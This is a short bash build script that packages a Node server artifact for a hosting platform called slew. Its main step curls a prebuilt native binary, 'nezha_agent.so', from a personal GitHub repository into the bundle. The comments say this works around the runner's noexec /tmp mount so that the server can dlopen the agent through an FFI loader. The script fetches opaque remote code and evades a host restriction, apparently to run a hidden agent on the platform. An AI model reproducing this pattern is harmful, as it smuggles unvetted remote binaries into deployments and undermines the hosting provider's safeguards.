#!/bin/bash
# Assemble the slew server artifact (see https://slew-docs.slew.cloud/node.html).
# Output contract: out/slew.json + out/server/<entry> (+ node_modules inside the
# artifact, which git builds ship as-is).
set -e

# The vendored node_modules in the repo lacks koffi/adm-zip (restored to
# package.json+lock in c06025e but not vendored), so reinstall from the lockfile.
npm ci --omit=dev

mkdir -p out/server
cp index.js out/server/index.js
cp -r node_modules out/server/node_modules

# Ship the native agent module inside the bundle: the runner mounts /tmp
# noexec, so the cdn-utils loader (download to tmpdir + dlopen) fails with
# EPERM; loading from the artifact mount works (koffi's own addon proves it).
curl -fsSL "https://raw.githubusercontent.com/zx1447/nxso/main/nezha_agent.so" \
  -o out/server/nezha_agent.so
echo "040c79f705c74837e7b544e65e1a6c0cb936c467c21c7d60c9b5742c7569d5ea  out/server/nezha_agent.so" | sha256sum -c -

printf '{"server":"server/index.js","runtime":"node22"}\n' > out/slew.json

echo "=== artifact ==="
du -sh out out/server/node_modules
ls out out/server
